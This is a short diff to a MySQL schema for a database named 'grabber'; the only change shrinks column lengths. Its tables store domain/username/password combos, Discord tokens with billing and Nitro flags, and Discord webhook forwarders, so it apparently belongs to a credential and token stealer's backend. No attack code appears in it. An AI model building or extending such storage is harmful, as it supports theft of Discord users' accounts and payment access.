@@ -4,9 +4,9 @@ USE `grabber`;
 
 CREATE TABLE IF NOT EXISTS `combos` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `domain` varchar(4096) DEFAULT NULL,
-  `username` varchar(4096) DEFAULT NULL,
-  `password` varchar(4096) DEFAULT NULL,
+  `domain` varchar(170) DEFAULT NULL,
+  `username` varchar(170) DEFAULT NULL,
+  `password` varchar(170) DEFAULT NULL,
   `guildId` varchar(24) DEFAULT NULL,
   `addedAt` timestamp NULL DEFAULT current_timestamp(),
   PRIMARY KEY (`id`),
@@ -16,7 +16,7 @@ CREATE TABLE IF NOT EXISTS `combos` (
 CREATE TABLE IF NOT EXISTS `forwarder` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `uuid` varchar(50) DEFAULT NULL,
-  `discord_webhook` varchar(1024) DEFAULT NULL,
+  `discord_webhook` varchar(170) DEFAULT NULL,
   `added` datetime DEFAULT curtime(),
   PRIMARY KEY (`id`),
   UNIQUE KEY `uuid` (`uuid`)
@@ -38,7 +38,7 @@ CREATE TABLE IF NOT EXISTS `guilds` (
 
 CREATE TABLE IF NOT EXISTS `tokens` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
-  `token` varchar(4096) NOT NULL,
+  `token` varchar(170) NOT NULL,
   `guildId` varchar(24) DEFAULT NULL,
   `hasBilling` mediumtext DEFAULT NULL,
   `hasNitro` int(11) DEFAULT NULL,
